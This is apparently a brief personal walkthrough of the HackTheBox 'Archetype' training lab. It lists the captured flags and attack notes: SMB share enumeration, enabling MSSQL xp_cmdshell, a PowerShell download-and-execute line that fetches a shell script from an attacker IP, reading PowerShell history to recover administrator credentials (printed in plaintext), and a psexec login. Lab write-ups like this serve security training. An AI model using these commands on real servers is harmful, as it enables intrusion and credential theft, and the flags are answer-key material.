# HackTheBox Archetype(starting-point)

> Saikat Karmakar | Mar 3:2021

> ip : 10.10.10.27

-------------------------------------------------------------------------------

1. user flag
```
3e7b102e78218e935bf3f4951fec21a3
```
2. root flag
```
b91ccec3305e98240082d4474b848528
```

--
-----------
***Notes***
-----------
list smb shares
smbclient -N -L //10.10.10.27
			or
smbclient -N -L \\\\10.10.10.27\\

```
SELECT IS_SRVROLEMEMBER('sysadmin')
EXEC sp_configure 'Show Advanced Options', 1;
reconfigure;
sp_configure;
EXEC sp_configure 'xp_cmdshell', 1reconfigure;
xp_cmdshell "whoami"
```
xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.16.21/shell.ps1\");" 

```
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt 

This reveals that the backups drive has been mapped using the local administrator credentials.
```
creds
```
user : administrator 
pass : MEGACORP_4dm1n!!
```

psexec.py administrator@10.10.10.27 



